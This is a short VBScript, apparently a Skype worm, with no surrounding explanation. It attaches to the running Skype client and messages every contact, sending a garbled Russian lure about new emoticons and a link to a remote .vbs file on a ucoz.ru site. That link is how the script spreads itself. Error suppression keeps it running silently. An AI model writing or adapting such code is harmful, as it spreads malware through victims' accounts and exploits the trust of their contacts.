on error resume next
set Skype = Wscript.CreateObject("Skype4COM.Skype", "Skype ")
Skype.Client.Start()
Skype.Attach()
For Each User In Skype.Friends
Skype.SendMessage User.handle," ������!!!"
Skype.SendMessage User.handle,"������ ����� ��������� ������ ��� (drunk) (rock) (finger) (mooning)(bug)(poolparty) � ������!? ����� ������ �� ����, �� ������ ����!!!" 
Skype.SendMessage User.handle,"http://mew.ucoz.ru/smilles.vbs"

next
